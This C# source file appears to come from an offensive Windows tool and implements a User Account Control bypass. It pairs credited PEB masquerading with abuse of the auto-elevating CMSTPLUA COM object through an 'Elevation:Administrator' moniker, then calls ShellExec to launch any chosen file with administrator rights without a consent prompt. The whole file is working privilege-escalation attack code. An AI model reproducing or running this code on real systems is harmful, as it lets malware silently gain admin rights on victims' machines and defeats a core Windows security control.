using System;
using System.Runtime.InteropServices;
using System.Text;
using static Offline.Special.Commons;

/*
|| AUTHOR https://www.796t.com/article.php?id=182188 ||
|| Found https://pingmaoer.github.io/2020/07/09/BypassUAC%E6%96%B9%E6%B3%95%E8%AE%BA%E5%AD%A6%E4%B9%A0/ ||
|| Original https://github.com/0xlane/BypassUAC ||
|| Found https://github.com/kosh-cyber/BypassUac ||
|| github : https://github.com/arsium       ||
|| This method combines PEB masquerading + abusing com object. Reworked the method from original method to make them working with x64 + manually resolve syscalls + testing some methods :)||
*/

namespace Offline.Special
{
    internal class COM
    {
        private unsafe static object LaunchElevatedCOMObjectUnsafe(Guid Clsid, Guid InterfaceID)
        {
            string CLSID = Clsid.ToString("B"); // B formatting directive: returns {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} 
            string monikerName = "Elevation:Administrator!new:" + CLSID;

            BIND_OPTS3 bo = new BIND_OPTS3();
            bo.cbStruct = (uint)Marshal.SizeOf(bo);
            bo.dwClassContext = (int)CLSCTX.CLSCTX_LOCAL_SERVER;
            void* retVal;

            int h = coGetObject(Encoding.Unicode.GetBytes(monikerName), &bo, &InterfaceID, &retVal);
            if (h != 0) return null;

            return Marshal.GetObjectForIUnknown((IntPtr)retVal);
        }

        internal unsafe static Parser.HRESULT Start(string filePath, string param = null)
        {
            //3E000D72-A845-4CD9-BD83-80C07C3B881F this one works but weird way with prompt (auto approval = false)
            //3E5FC7F9-9A51-4367-9063-A120244FBEC7

            Guid classId = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");

            //D4309536-E369-4241-A4DD-3D10A257A1C2
            //6EDD6D74-C007-4E75-B76A-E5740995E24C

            Guid interfaceId = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

            object elvObject = LaunchElevatedCOMObjectUnsafe(classId, interfaceId);

            if (elvObject != null)
            {
                ILua ihw = (ILua)elvObject;
                ihw.ShellExec(filePath, null, null, 0, 5);
                Marshal.ReleaseComObject(elvObject);
                return Parser.HRESULT.S_OK;
            }
            return Parser.HRESULT.S_FALSE;
        }
    }
}
